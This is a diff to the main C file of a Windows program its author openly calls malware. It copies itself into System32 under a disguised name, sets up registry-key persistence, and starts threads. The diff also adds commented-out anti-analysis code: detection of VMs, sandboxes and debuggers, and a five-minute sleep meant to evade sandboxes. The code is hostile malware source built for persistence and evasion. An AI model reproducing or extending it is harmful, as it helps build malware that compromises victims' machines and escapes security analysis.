@@ -1,10 +1,9 @@
 
-#include <stdio.h>
-
 #include "program/program.h"
-#include "z_anti_vm/anti_vm.h"
-#include "z_persistence/registry.h"
+#include "persistence/registry.h"
+#include "env_detection/env_detector.h"
 
+#include <stdio.h>
 
 // give our malware a very unsuspicious name :)
 #define EXEC_PATH1 "C:\\Windows\\System32\\JamesBond.exe"
@@ -35,9 +34,12 @@ void check() {   // just ensuring if I accidently run it then it doesn't infect 
 int main(int argc, char** argv) {
     check();
 
-    // // vbox and vmware detection!
-    // ERR_CODE ret = detectVM();
-    // if (ret == ECODE_VMWARE_DETECTED || ret == ECODE_VBOX_DETECTED) {
+    // // Sleep for 5 minutes - anti sandbox technique!
+    // Sleep(300000);
+
+    // // detect vms, sandboxes, and debuggers!
+    // ERR_CODE ret = detectAnalysisTools();
+    // if (ret != ECODE_SAFE_RET) {
     //     printf("RET: %s", getErrMessage(ret));
     //     exit(1);
     // }
@@ -56,6 +58,8 @@ int main(int argc, char** argv) {
 }
 
 static void run(char* path, char* arg) {
+
+
     // ensure we are being run from the correct place and with correct argument
     if ((strcmp(path, EXEC_PATH1) != 0 && strcmp(path, EXEC_PATH2) != 0)
             || ((strcmp(arg, FIRST_RUN_FROM_SYS32) != 0) && strcmp(arg, RUN_FROM_REGISTRY) != 0)) { 
@@ -72,11 +76,8 @@ static void run(char* path, char* arg) {
     // then we want to generate 
     if (strcmp(arg, FIRST_RUN_FROM_SYS32) == 0) {  // -007 
         ERR_CODE ret;
-        if (!is64Bit) {
-            ret = generateRegKey(EXEC_PATH1, RUN_FROM_REGISTRY, KEY_WRITE);
-        } else {
-            ret = generateRegKey(EXEC_PATH2, RUN_FROM_REGISTRY, KEY_WRITE | KEY_WOW64_64KEY);
-        }
+        if (!is64Bit) { ret = generateRegKey(EXEC_PATH1, RUN_FROM_REGISTRY, KEY_WRITE); } 
+        else          { ret = generateRegKey(EXEC_PATH2, RUN_FROM_REGISTRY, KEY_WRITE | KEY_WOW64_64KEY); }
 
         if (ret != ECODE_SUCCESS) {
             printf("Failed to generate registry key.\n");
@@ -91,7 +92,7 @@ static void run(char* path, char* arg) {
         programCleanup();
         exit(ret);
     }
-    
+
     ret = startThreads();
     printf("Cleaning up.\nProgram exited with msg: %s", getErrMessage(ret));
 
